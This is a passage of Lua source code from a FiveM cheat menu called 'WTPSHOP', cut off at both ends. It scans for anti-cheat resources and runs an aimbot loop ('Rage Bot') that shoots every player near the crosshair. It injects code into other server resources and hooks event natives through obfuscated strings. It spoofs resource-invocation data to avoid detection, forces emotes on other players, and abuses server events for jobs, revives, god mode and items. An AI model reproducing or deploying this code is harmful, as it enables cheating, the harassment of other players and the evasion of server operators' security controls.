                                            return {name = ac.name, resourceName = resourceName}
                                        else
                                        end
                                    end
                                    return nil
                                end

                                for i = 0, numResources - 1 do
                                    local resourceName = GetResourceByFindIndex(i)
                                    local acDetails = checkForACFiles(resourceName)
                                    if acDetails then
                                        table.insert(detectedACs, acDetails)
                                        acDetected = true
                                    end
                                end

                                if acDetected then
                                    local acMessage = "AC Detected:\n"
                                    for _, ac in ipairs(detectedACs) do
                                        acMessage = acMessage .. ac.name .. " in " .. ac.resourceName .. "\n"
                                    end
                                    self:Notify("info", "WTPSHOP", acMessage, 3000)
                                else
                                    self:Notify("info", "WTPSHOP", "No Anti-Cheat Found !", 3000)
                                end
                            end
                        },
                    }
                },
                {
                    label = "Rage Bot",
                    tabs = {
                        {
                            type = "checkbox",
                            label = "Enable",
                            checked = fovEnabled,
                            onSelect = function(checked)
                                fovEnabled = checked
                                WTPSHOP:SendMessage({
                                    action = "updateFOV",
                                    enabled = fovEnabled,
                                    show = fovShow,
                                    radius = fovRadius
                                })
                                if checked then
                                    self:Notify("info", "WTPSHOP", "RageBot Started", 3000)

                                    ApiRasclat.SafeRes(string.format([[
                                        _G.KillEveryoneLoop = true
                                        local weaponName = 'vehicle_weapon_subcar_mg'
                                        _G.fovLimit = %s 

                                        WTPSHOP.Native(CreateThread, function()
                                            local weapon = GetHashKey(weaponName)
                                            
                                            RequestWeaponAsset(weapon, 31, 26)
                                            while not HasWeaponAssetLoaded(weapon) and _G.KillEveryoneLoop do 
                                                Wait(500) 
                                            end

                                            while _G.KillEveryoneLoop do
                                                local selfPed = PlayerPedId()
                                                local selfCoords = GetEntityCoords(selfPed)

                                                local players = GetActivePlayers()
                                                for _, playerId in ipairs(players) do
                                                    local targetPed = GetPlayerPed(playerId)

                                                    if targetPed ~= selfPed and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                        local targetCoords = GetEntityCoords(targetPed)
                                                        local onScreen, screenX, screenY = WTPSHOP.Native(GetScreenCoordFromWorldCoord, targetCoords.x, targetCoords.y, targetCoords.z)
                                                        if onScreen then
                                                            local dx = screenX - 0.5
                                                            local dy = screenY - 0.5
                                                            local distToCenter = math.sqrt(dx*dx + dy*dy) * 1000 

                                                            if distToCenter <= _G.fovLimit then
                                                                WTPSHOP.Native(ShootSingleBulletBetweenCoords,
                                                                    targetCoords.x, targetCoords.y, targetCoords.z + 0.5, 
                                                                    targetCoords.x, targetCoords.y, targetCoords.z, 
                                                                    100, true, weapon, selfPed, true, false, 1000.0
                                                                )
                                                            end
                                                        end
                                                    end
                                                end
                                                WTPSHOP.Native(Wait, 10)
                                            end
                                        end)
                                    ]], fovRadius))
                                else
                                    featureExecute("troll", [[ _G.KillEveryoneLoop = false ]])
                                    self:Notify("info", "WTPSHOP", "RageBot Stopped", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Settings" },
                        {
                            type = "slider-checkbox",
                            label = "Show FOV Circle",
                            scrollType = "onScroll",
                            checked = fovShow,
                            value = fovRadius,
                            step = 1, min = 1, max = 200,
                            onSelect = function(sliderValue, checked)
                                fovShow = checked
                                ApiRasclat.SafeRes(string.format([[ _G.fovLimit = %s ]], sliderValue))

                                WTPSHOP:SendMessage({
                                    action = "updateFOV",
                                    enabled = fovEnabled,
                                    show = fovShow,
                                    radius = sliderValue
                                })
                            end
                        },
                    }
                }
            }
        },
    }

    CurrentMenu = ActiveMenu
    CurrentCategories = nil
    CurrentCategoryIndex = 1
    HoveredIndex = 1
end

local _serverTriggersBuilt = false

local INJECT_EMOTE_WC_DPE = [[
    local function TriggerTaraEmote()
        TriggerServerEvent('ServerValidEmote', '-1', 'köpek', 'köpek', 1405553601)
    end
    TriggerTaraEmote()
]]

local INJECT_EMOTE_RPE_CONFIRM = [[
    local function SafeWrap(fn)
        return function(...)
            if type(fn) == 'function' then
                return fn(...)
            end
        end
    end
    local SafeSTrigger = SafeWrap(TriggerServerEvent)
    SafeSTrigger('rpemotes:server:confirmEmote', '-1', 'cuffedfront', 'cuffedfront', 1405553601)
]]

local function buildItemGiveCall(bodyTemplate, itemName, itemCount)
    return string.format([[
        local function Gimme(item, amount)
            %s
        end
        Gimme(%q, %d)
    ]], bodyTemplate, itemName, itemCount)
end

function WTPSHOP:EnsureServerTriggers()
    if _serverTriggersBuilt then return end
    _serverTriggersBuilt = true
    if GetResourceState("ox_lib") == "started" or GetResourceState("lb-phone") == "started" or GetResourceState("monitor") == "started" or GetResourceState("core") == "started" or GetResourceState("es_extended") == "started" or GetResourceState("qb-core") == "started" or GetResourceState("ox_lib") == "started" then
        AddTrigger({
            type = "button",
            label = "Deobfuscate Events",
            onSelect = function()
                WTPSHOP:HideUI()
                local resourceName = nil
                local done = false

                KeyboardInput("Resource Name", "", function(val)
                    if val and val ~= "" then
                        resourceName = val
                    end
                    done = true
                end, "typeable")

                while not done do
                    Wait(100)
                end

                if not resourceName or resourceName == "" then
                    MachoMenuNotification("Error", "No resource name entered.")
                    WTPSHOP:ShowUI()
                    return
                end

                _G.WTPSHOPTriggerScanResource = resourceName

                if GetResourceState(resourceName) ~= "started" then
                    MachoMenuNotification("Error", "Resource ^3" .. resourceName .. "^7 is not started or doesn’t exist.")
                    WTPSHOP:ShowUI()
                    return
                end

                local payload = [[
                    local d = function(t)
                        local s = ""
                        for i = 1, #t do s = s .. string.char(t[i]) end
                        return s
                    end
                    local g = function(e) return _G[d(e)] end
                    local w = function(ms) Citizen.Wait(ms) end

                    local function SimpleJsonEncode(value)
                        if type(value) == "table" then
                            local parts = {}
                            local isArray = true
                            local maxIndex = 0
                            for k, _ in pairs(value) do
                                if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                    isArray = false
                                    break
                                end
                                maxIndex = math.max(maxIndex, k)
                            end
                            if isArray then
                                for i = 1, maxIndex do
                                    local v = value[i]
                                    parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                                end
                                return "[" .. table.concat(parts, ",") .. "]"
                            else
                                for k, v in pairs(value) do
                                    if type(k) == "string" then
                                        parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                    end
                                end
                                return "{" .. table.concat(parts, ",") .. "}"
                            end
                        elseif type(value) == "string" then
                            return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                        elseif type(value) == "number" or type(value) == "boolean" then
                            return tostring(value)
                        elseif value == nil then
                            return "null"
                        else
                            return "\"[unserializable:" .. type(value) .. "]\""
                        end
                    end

                    local function HookNative(nativeName, newFunction)
                        local original = _G[nativeName]
                        if original and type(original) == "function" then
                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(original, ...)
                            end
                        end
                    end

                    local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                    local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                    HookNative(te, function(orig, eventName, ...)
                        local args = {...}
                        local encoded = {}
                        for i, arg in ipairs(args) do
                            encoded[i] = SimpleJsonEncode(arg)
                        end
                        print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                        return orig(eventName, ...)
                    end)

                    HookNative(tse, function(orig, eventName, ...)
                        local args = {...}
                        local encoded = {}
                        for i, arg in ipairs(args) do
                            encoded[i] = SimpleJsonEncode(arg)
                        end
                        print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                        return orig(eventName, ...)
                    end)
                ]]

                executeCode(resourceName, payload)

                MachoMenuNotification("Injector", "Hooks injected into ^3" .. resourceName .. "^7 successfully!")
                WTPSHOP:ShowUI()
            end
        })
    end

    local function addEmoteBringTrigger(resourceName, useRpeConfirm)
        AddTrigger({
            type = "button",
            label = "Bring All Nearby Players",
            onSelect = function()
                if useRpeConfirm and IsDetections then
                    WTPSHOP:Notify("info", "WTPSHOP", "Security detected Method disabled.", 3000)
                    return
                end
                WTPSHOP:Notify("success", "WTPSHOP", "Attempting to bring all players", 3000)
                executeCode(resourceName, useRpeConfirm and INJECT_EMOTE_RPE_CONFIRM or INJECT_EMOTE_WC_DPE)
            end
        })
    end

    if GetResourceState("WC_EMOTES_V5") == "started" then
        addEmoteBringTrigger("WC_EMOTES_V5", false)
    end

    if GetResourceState("dpemotes") == "started" then
        addEmoteBringTrigger("dpemotes", false)
    end

    if GetResourceState("rpemotes") == "started" then
        addEmoteBringTrigger("rpemotes", true)
    elseif GetResourceState("rpemotes-reborn") == "started" then
        addEmoteBringTrigger("rpemotes", true)
    end

    if GetResourceState("pma-voice") == "started" then
        AddTrigger({
            type = "button",
            label = "Connect Radio Frequency",
            onSelect = function()
                KeyboardInput("Enter Radio Frequency", "", function(val)
                    if val and val ~= "" then
                        local radioChannel = tonumber(val) or 0

                        if radioChannel > 0 then
                            executeCode("pma-voice", string.format([[
                                local channel = tonumber("%s")
                                if channel then
                                    exports["pma-voice"]:setRadioChannel(channel)
                                    exports["pma-voice"]:setVoiceProperty("radioEnabled", true)
                                end
                            ]], radioChannel))
                            WTPSHOP:Notify("info", "WTPSHOP", "Successfully connected to " .. radioChannel, 2000)
                        else
                            WTPSHOP:Notify("error", "WTPSHOP", "Invalid radio frequency entered.", 4000)
                        end
                    else
                        WTPSHOP:Notify("info", "WTPSHOP", "Radio frequency connection cancelled.", 2000)
                    end
                end, "typeable")
            end
        })
    end

    if GetResourceState("pma-voice") == "started" then
        AddTrigger({
            type = "button",
            label = "Leave Radio Frequency",
            onSelect = function()
                WTPSHOP:Notify("info", "WTPSHOP", "Leave radio successfully", 2000)
                executeCode("pma-voice", [[
                    exports["pma-voice"]:setRadioChannel(0)
                    exports["pma-voice"]:setVoiceProperty("radioEnabled", false)
                ]])
            end
        })
    end

    if GetResourceState("es_extended") == "started" then
        AddTrigger({
            type = "button",
            label = "Setjob",
            onSelect = function()
                WTPSHOP:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false
                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")
                    while not done do Wait(0) end
                    return result
                end

                local jobName = GetInput("Job Name (Ex: police, ambulance, mechanic)", "")
                if not jobName or jobName == "" then
                    WTPSHOP:Notify("error", "WTPSHOP", "Invalid Job", 3000)
                    WTPSHOP:ShowUI()
                    return
                end

                local inputGrade = GetInput("Grade (Ex: 0-10)", "")
                local jobGrade = tonumber(inputGrade) or 0

                executeCode("es_extended", string.format([[
                    local function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative then return end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    local fake_execution_data = {
                        ran_from_cheat = false,
                        path = "core/server/main.lua",
                        execution_id = "324341234567890"
                    }

                    local original_GIRD = GetInvokingResourceData
                    _G.GetInvokingResourceData = function()
                        return fake_execution_data
                    end

                    ESX.SetPlayerData("job", {
                        name = "%s",
                        label = "%s",
                        grade = %d,
                        grade_name = "boss",
                        grade_label = "Boss"
                    })

                    TriggerEvent('esx:setJob', {
                        name = "%s",
                        label = "%s",
                        grade = %d,
                        grade_name = "boss",
                        grade_label = "Boss"
                    })

                    _G.GetInvokingResourceData = original_GIRD
                ]], jobName, jobName:upper(), jobGrade, jobName, jobName:upper(), jobGrade))

                WTPSHOP:Notify("success", "WTPSHOP", "Job Set: " .. jobName, 4000)
                WTPSHOP:ShowUI()
            end
        })
    end

    if GetResourceState("scully_emotemenu") == 'started' then
        AddTrigger({ type = "button", label = "Scan Scully Dance/Shared (F8)",
            desc = "Manual scan only — prints to F8 and updates Force Dance list from server pack.",
            onSelect = function()
                scanScullyEmotesToF8()
                local danceCount = refreshScullyForceDanceMenuValues()
                WTPSHOP:Notify("info", "WTPSHOP",
                    "Scully scan done — F8 for full list. Force Dance: " .. tostring(danceCount) .. " entries.", 5000)
            end
        })
        AddTrigger({ type = "scrollable", label = "Force Dance (All)", desc = "Builtin list until you run Scan Scully. Nearby players only.", scrollType = "onEnter", value = 1, values = getScullyBuiltinDanceLabels(),
            onSelect = function(value)
                local d = getScullyForceDanceEntry(value)
                if not d then return end
                ApiRasclat.SafeRes(buildScullySyncNearbyInject(d))
            end
        })
    end

    if GetResourceState("wasabi_multijob") == 'started' then
        AddTrigger({ type = "button", label = "Set Job #3 (Police)",
            onSelect = function()
            executeCode("wasabi_multijob", [[
                local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
                CheckJob(job, true) 
            ]])
            executeCode("wasabi_multijob", [[
                SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
            ]])
            end
        })
    end

    if GetResourceState("wasabi_multijob") == 'started' then
        AddTrigger({ type = "button", label = "Set Job #2 (EMS)",
            onSelect = function()
            executeCode("wasabi_multijob", [[
                local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
                CheckJob(job, true)
            ]])
            executeCode("wasabi_multijob", [[
                SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
            ]])
            end
        })
    end

    if GetResourceState("wasabi_crutch") == "started" then
        AddTrigger({
            type = "button",
            label = "Remove Crutch",
            onSelect = function()
                executeCode("wasabi_crutch", [[
                    _G.setWeaponsEnabled = function()
                        LocalPlayer.state.canUseWeapons = true
                    end

                    _G.StopCrutchLoop = true
                    _G.BreakLoop = true

                    if DisableKeys then
                        DisableKeys.crutch = nil
                    end

                    _G.setWeaponsEnabled()

                    ResetPedMovementClipset(PlayerPedId())

                    local pool = GetGamePool("CObject")

                    for _, obj in pairs(pool) do
                        if DoesEntityExist(obj) then
                            if GetEntityModel(obj) == GetHashKey("crutch") then
                                DeleteObject(obj)
                            end
                        end
                    end

                    _G.isCrutchActive = false
                    _G.crutchTimer = 0
                    _G.StartCrutchLoop = function() end
                ]])
            end
        })
    end

    if GetResourceState("wasabi_crutch") == "started" then
        AddTrigger({
            type = "button",
            label = "Remove Wheelchair",
            onSelect = function()
                executeCode("wasabi_crutch", [[
                    _G.setWeaponsEnabled = function()
                        LocalPlayer.state.canUseWeapons = true
                    end

                    _G.StopChairLoop = true
                    _G.BreakLoop = true

                    if DisableKeys then
                        DisableKeys.chair = nil
                    end

                    _G.setWeaponsEnabled()

                    local ped = PlayerPedId()

                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        DeleteVehicle(veh)
                    end

                    _G.isWheelchairActive = false
                    _G.crutchTimer = 0
                    _G.StartChairLoop = function() end
                ]])
            end
        })
    end

    if GetResourceState("rryban_secure") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "Ryban Exploit",
            categories = {
                {
                    label = "Exploit",
                    tabs = {
                        {
                            label = "Remove Bleeding",
                            type = "button",
                            onSelect = function()
                                executeCode("esx_ambulancejob", [[
                                    exports.esx_ambulancejob:StopBleeding()
                                ]])
                            end
                        },
                        {
                            label = "Revive Self",
                            type = "button",
                            onSelect = function()
                                MachoInjectResourceScriptOverride(3, "esx_ambulancejob", [[
                                    stopPlayerDeath({
                                        command = true
                                    })
                                ]], _rvFindSpoofPath("esx_ambulancejob"), 1, 1000)
                            end
                        },
                        {
                            label = "Heal Exploit",
                            type = "button",
                            onSelect = function()
                                MachoInjectResourceScriptOverride(3, "esx_ambulancejob", [[
                                    healPlayer({
                                        command = true
                                    })
                                ]], _rvFindSpoofPath("esx_ambulancejob"), 1, 1000)
                            end
                        },
                        {
                            label = "TreatInjury Exploit",
                            type = "button",
                            onSelect = function()
                                MachoInjectResourceScriptOverride(3, "esx_ambulancejob", [[
                                    treatInjury()
                                ]], _rvFindSpoofPath("esx_ambulancejob"), 1, 1000)
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("wasabi_ambulance_v2") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "Wasabi Ambulance",
            categories = {
                {
                    label = "Medical",
                    tabs = {
                        {
                            label = "Revive Player",
                            type = "button",
                            onSelect = function()
                                local targetId = tonumber(getInput("Player ID", "127"))
                                if targetId then
                                    executeCode("wasabi_ambulance_v2", string.format([[
                                        local targetId = %s
                                        local function RevivePlayer()
                                            local ped = PlayerPedId()
                                            local pedMaxHealth = GetPedMaxHealth(ped)
                                            SetEntityHealth(ped, pedMaxHealth)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            if IsEntityDead(ped) then
                                                local coords = GetEntityCoords(ped)
                                                NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, GetEntityHeading(ped), 0, false)
                                            end
                                            LocalPlayer.state.wasabiDeathState = 0
                                            LocalPlayer.state.isDead = false
                                        end
                                        RevivePlayer()
                                    ]], targetId))
                                end
                            end
                        },
                        {
                            label = "Self Revive",
                            type = "button",
                            onSelect = function()
                                executeCode("wasabi_ambulance_v2", [[
                                    local function SelfRevive()
                                        local ped = PlayerPedId()
                                        local pedMaxHealth = GetPedMaxHealth(ped)
                                        SetEntityHealth(ped, pedMaxHealth)
                                        ClearPedBloodDamage(ped)
                                        ClearPedTasksImmediately(ped)
                                        if IsEntityDead(ped) then
                                            local coords = GetEntityCoords(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, GetEntityHeading(ped), 0, false)
                                        end
                                        LocalPlayer.state.wasabiDeathState = 0
                                        LocalPlayer.state.isDead = false
                                    end
                                    SelfRevive()
                                ]])
                            end
                        },
                        {
                            label = "Full Heal",
                            type = "button",
                            onSelect = function()
                                executeCode("wasabi_ambulance_v2", [[
                                    local function FullHeal()
                                        local ped = PlayerPedId()
                                        local pedMaxHealth = GetPedMaxHealth(ped)
                                        SetEntityHealth(ped, pedMaxHealth)
                                        ClearPedBloodDamage(ped)
                                        ClearPedTasksImmediately(ped)
                                    end
                                    FullHeal()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("luxu_admin") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "Luxu Admin",
            categories = {
                {
                    label = "Admin",
                    tabs = {
                        {
                            label = "Self Revive",
                            type = "button",
                            onSelect = function()
                                executeCode("luxu_admin", [[
                                    local function SelfRevive()
                                        local ped = PlayerPedId()
                                        local pedMaxHealth = GetPedMaxHealth(ped)
                                        SetEntityHealth(ped, pedMaxHealth)
                                        ClearPedBloodDamage(ped)
                                        if IsEntityDead(ped) then
                                            local coords = GetEntityCoords(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, GetEntityHeading(ped), 0, false)
                                        end
                                    end
                                    SelfRevive()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("jg-mechanic") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "JG Mechanic",
            categories = {
                {
                    label = "Vehicle",
                    tabs = {
                        {
                            label = "Free Repair",
                            type = "button",
                            onSelect = function()
                                executeCode("jg-mechanic", [[
                                    local function FreeRepair()
                                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if vehicle ~= 0 then
                                            SetVehicleFixed(vehicle)
                                            SetVehicleDeformationFixed(vehicle)
                                            SetVehicleUndriveable(vehicle, false)
                                            SetVehicleEngineOn(vehicle, true, true)
                                        end
                                    end
                                    FreeRepair()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("hrs_fuel_V2") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "HRS Fuel",
            categories = {
                {
                    label = "Fuel",
                    tabs = {
                        {
                            label = "Full Fuel",
                            type = "button",
                            onSelect = function()
                                executeCode("hrs_fuel_V2", [[
                                    local function FullFuel()
                                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if vehicle ~= 0 then
                                            SetVehicleFuelLevel(vehicle, 100.0)
                                        end
                                    end
                                    FullFuel()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("hrs_vehicles") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "HRS Vehicles",
            categories = {
                {
                    label = "Vehicle",
                    tabs = {
                        {
                            label = "Repair Vehicle",
                            type = "button",
                            onSelect = function()
                                executeCode("hrs_vehicles", [[
                                    local function RepairVehicle()
                                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if vehicle ~= 0 then
                                            SetVehicleFixed(vehicle)
                                            SetVehicleDeformationFixed(vehicle)
                                        end
                                    end
                                    RepairVehicle()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("RxZ_Recyclers") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "RxZ Recyclers",
            categories = {
                {
                    label = "Recycle",
                    tabs = {
                        {
                            label = "Quick Recycle",
                            type = "button",
                            onSelect = function()
                                local count = tonumber(getInput("Count", "10")) or 1
                                executeCode("RxZ_Recyclers", string.format([[
                                    local count = %s
                                    local function QuickRecycle()
                                        for i = 1, count do
                                            TriggerServerEvent('RxZ:Recycle')
                                        end
                                    end
                                    QuickRecycle()
                                ]], count))
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("RxZ_Smelters") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "RxZ Smelters",
            categories = {
                {
                    label = "Smelt",
                    tabs = {
                        {
                            label = "Quick Smelt",
                            type = "button",
                            onSelect = function()
                                local count = tonumber(getInput("Count", "10")) or 1
                                executeCode("RxZ_Smelters", string.format([[
                                    local count = %s
                                    local function QuickSmelt()
                                        for i = 1, count do
                                            TriggerServerEvent('RxZ:Smelt')
                                        end
                                    end
                                    QuickSmelt()
                                ]], count))
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("hrs_zombies_V2") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "HRS Zombies",
            categories = {
                {
                    label = "Zombie",
                    tabs = {
                        {
                            label = "Kill All Zombies",
                            type = "button",
                            onSelect = function()
                                executeCode("hrs_zombies_V3_BETA", [[
                                    local function KillZombies()
                                        local peds = GetGamePool('CPed')
                                        for _, ped in ipairs(peds) do
                                            if IsPedAPlayer(ped) == false then
                                                SetEntityHealth(ped, 0)
                                            end
                                        end
                                    end
                                    KillZombies()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("hrs_defense") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "HRS Defense",
            categories = {
                {
                    label = "Defense",
                    tabs = {
                        {
                            label = "God Mode",
                            type = "button",
                            onSelect = function()
                                executeCode("hrs_defense", [[
                                    local function GodMode()
                                        local ped = PlayerPedId()
                                        SetEntityInvincible(ped, true)
                                    end
                                    GodMode()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("hrs_deadbag_V2") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "HRS Deadbag",
            categories = {
                {
                    label = "Deadbag",
                    tabs = {
                        {
                            label = "Remove Deadbag",
                            type = "button",
                            onSelect = function()
                                executeCode("hrs_deadbag_V2", [[
                                    local function RemoveDeadbag()
                                        local ped = PlayerPedId()
                                        local coords = GetEntityCoords(ped)
                                        local objects = GetGamePool('CObject')
                                        for _, obj in ipairs(objects) do
                                            local objCoords = GetEntityCoords(obj)
                                            local dist = #(coords - objCoords)
                                            if dist < 3.0 then
                                                DeleteEntity(obj)
                                            end
                                        end
                                    end
                                    RemoveDeadbag()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("hrs_gather") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "HRS Gather",
            categories = {
                {
                    label = "Gather",
                    tabs = {
                        {
                            label = "Auto Gather",
                            type = "button",
                            onSelect = function()
                                executeCode("hrs_gather", [[
                                    local function AutoGather()
                                        local ped = PlayerPedId()
                                        local coords = GetEntityCoords(ped)
                                        TriggerServerEvent('hrs:gatherItem', 'water', 10)
                                    end
                                    AutoGather()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("cfx-clny-core") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "CFX Colony Status",
            categories = {
                {
                    label = "Status",
                    tabs = {
                        {
                            label = "Auto Hunger/Thirst - ON",
                            type = "button",
                            onSelect = function()
                                executeCode("cfx-clny-core", [[
                                    local autoHungerThirstRunning = true
                                    CreateThread(function()
                                        while autoHungerThirstRunning do
                                            TriggerServerEvent('cfx-clny-status:AddHunger', 100)
                                            TriggerServerEvent('cfx-clny-status:AddThrist', 100)
                                            Wait(50000)
                                        end
                                    end)
                                ]])
                                print("[CFX Colony] Auto Hunger/Thirst ENABLED")
                            end
                        },
                        {
                            label = "Auto Hunger/Thirst - OFF",
                            type = "button",
                            onSelect = function()
                                executeCode("cfx-clny-core", [[
                                    autoHungerThirstRunning = false
                                ]])
                                print("[CFX Colony] Auto Hunger/Thirst DISABLED")
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("cfx-praryo-kernel") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "NXGN Exploit",
            categories = {
                {
                    label = "Exploit",
                    tabs = {
                        {
                            label = "Macho Pills",
                            type = "button",
                            desc = "Fully restores vitals, removes stress, and boosts speed.",
                            onSelect = function()
                                ApiRasclat.ExecuteFeature("self", [[
                                    local illegalProduct1 = 0
                                    WTPSHOP.Native(Wait, 2500)
                                    WTPSHOP.Native(SetEntityHealth, PlayerPedId(), 200)
                                    WTPSHOP.Native(SetPedArmour, PlayerPedId(), 95)
                                    WTPSHOP.Native(ResetPlayerStamina, PlayerPedId())
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                    
                                    WTPSHOP.Native(CreateThread, function()
                                        illegalProduct1 = illegalProduct1 + 1500
                                        
                                        WTPSHOP.Native(SetPedMoveRateOverride, PlayerPedId(), 10.0)
                                        WTPSHOP.Native(SetRunSprintMultiplierForPlayer, PlayerPedId(), 1.2)
                                        
                                        while illegalProduct1 > 0 do
                                            WTPSHOP.Native(Wait, 1000)
                                            illegalProduct1 = illegalProduct1 - 1000
                                        end
                                        
                                        WTPSHOP.Native(SetPedMoveRateOverride, PlayerPedId(), 10.0)
                                        WTPSHOP.Native(SetRunSprintMultiplierForPlayer, PlayerPedId(), 1.0)  
                                    end)
                                ]])
                            end
                        },
                        {
                            label = "Golden Pill",
                            type = "button",
                            desc = "Fully restores vitals, and removes bleeding.",
                            onSelect = function()
                                ApiRasclat.ExecuteFeature("self", [[
                                    WTPSHOP.Native(Wait, 2500)
                                    WTPSHOP.Native(SetEntityHealth, PlayerPedId(), 200)
                                    WTPSHOP.Native(SetPedArmour, PlayerPedId(), 95)
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                ]])
                            end
                        },
                        {
                            label = "Purple Haze",
                            type = "button",
                            desc = "Fully restores vitals, removes stress, and boosts speed.",
                            onSelect = function()
                                ApiRasclat.ExecuteFeature("self", [[
                                    WTPSHOP.Native(Wait, 2500)
                                    WTPSHOP.Native(SetEntityHealth, PlayerPedId(), 200)
                                    WTPSHOP.Native(SetPedArmour, PlayerPedId(), 95)
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                ]])
                            end
                        },
                        {
                            label = "Remove Bleeding",
                            type = "button",
                            desc = "This will remove your all bleeding.",
                            onSelect = function()
                                ApiRasclat.SafeRes([[
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    local triggerCount = 0
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server Options" and menu.categories then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" and cat.tabs then
                    triggerCount = #cat.tabs
                end
            end
        end
    end
    WTPSHOP:Notify("info", "WTPSHOP", "Server triggers loaded (" .. triggerCount .. " entries).", 3500)
    WTPSHOP:RefreshTriggersTabIfActive()
end

function WTPSHOP:RefreshTriggersTabIfActive()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    if CurrentCategories[CurrentCategoryIndex].label ~= "Triggers" then return end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or CurrentMenu
    self:UpdateElements(CurrentMenu)
end
local function AddTrigger(data)
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server Options" then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" then
                    cat.tabs[#cat.tabs + 1] = data
                    return
                end
            end
        end
    end
end

function WTPSHOP:UpdateTabChecked(menu, label, checked)
    for _, tab in pairs(menu or {}) do
        if tab.label == label and (tab.type == "checkbox" or tab.type == "slider-checkbox" or tab.type:find("checkbox")) then
            tab.checked = checked
        elseif tab.type == "subMenu" then
            if tab.categories then
                for _, cat in pairs(tab.categories) do
                    self:UpdateTabChecked(cat.tabs, label, checked)
                end
            end

            if tab.subTabs then
                self:UpdateTabChecked(tab.subTabs, label, checked)
            end
        end
    end
end

function WTPSHOP:ShowKeybindList(binds)
    self:SendMessage({ action = "displayBinds", visible = true, binds = binds })
end

function WTPSHOP:HideKeybindList()
    self:SendMessage({ action = "displayBinds", visible = false })
end

function WTPSHOP:GetNearbyPlayers(coords, maxDistance, includePlayer)
    local nearby = {}
    -- local myPed = PlayerPedId()
    maxDistance = maxDistance or 500.0

    -- if not myPed or not DoesEntityExist(myPed) or not IsPlayerPlaying(PlayerId()) then
    --     nearby = {}
    --     return nearby
    -- end

    local activePlayers = GetActivePlayers()

    if activePlayers then
        for _, playerId in ipairs(activePlayers) do
            if includePlayer or playerId ~= PlayerId() then
                local ped = GetPlayerPed(playerId)
                -- if ped and DoesEntityExist(ped) and IsEntityAPed(ped) and not IsEntityDead(ped) then
                if ped and DoesEntityExist(ped) and IsEntityAPed(ped) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
        end
